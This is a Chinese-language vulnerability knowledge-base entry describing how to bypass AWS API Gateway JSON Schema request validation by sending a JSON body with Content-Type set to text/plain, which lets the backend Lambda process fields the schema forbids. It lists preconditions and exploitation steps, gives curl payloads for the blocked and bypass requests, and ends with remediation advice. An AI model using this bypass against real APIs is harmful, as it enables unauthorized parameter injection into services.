---
id: APIGW-CONTENT-TYPE-BYPASS
title: API Gateway 请求验证绕过 — Content-Type 欺骗
product: aws-apigateway
vendor: Amazon
severity: HIGH
tags: [validation-bypass, api-gateway, aws, content-type]
fingerprint: ["execute-api", "amazonaws.com", "API Gateway", "Invalid request body"]
---

## 漏洞描述

AWS API Gateway 的 Request Validator（请求模型验证）仅在 `Content-Type: application/json` 时执行 JSON Schema 校验。将 Content-Type 改为 `text/plain` 后，API Gateway 跳过 Schema 验证，但 Lambda 函数仍然通过 `json.loads(event["body"])` 正常解析 JSON 请求体。攻击者可以注入被 JSON Schema 禁止的字段。

## 前置条件

- API Gateway 配置了 Request Validator + JSON Schema Model
- 后端 Lambda 使用 `json.loads()` 解析请求体（不依赖 Content-Type）
- 存在被 Schema 禁止但 Lambda 会处理的参数

## 利用步骤

1. 发送正常 `application/json` 请求，确认包含额外字段时被拦截
2. 将 Content-Type 改为 `text/plain`，保持 JSON 请求体不变
3. API Gateway 跳过验证，Lambda 正常解析并处理被禁止的字段

## Payload

```bash
# 被拦截（JSON Schema 校验生效）
curl -X POST "https://API.execute-api.REGION.amazonaws.com/prod/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","template":"/flag"}'
# → {"message": "Invalid request body"}

# 绕过（Content-Type: text/plain 跳过校验）
curl -X POST "https://API.execute-api.REGION.amazonaws.com/prod/endpoint" \
  -H "Content-Type: text/plain" \
  -d '{"name":"test","template":"/flag"}'
# → {"status": "success", ...}
```

## 验证方法

使用 `text/plain` Content-Type 后，之前被拒绝的请求被成功处理，Lambda 接受了被 Schema 禁止的参数。

## 修复建议

1. 在 Lambda 内部做参数白名单校验，不依赖 API Gateway
2. 在 API Gateway Integration Request 中限制仅接受 `application/json`
3. Lambda 内部检查 `event["headers"]["content-type"]` 并拒绝非 JSON 请求
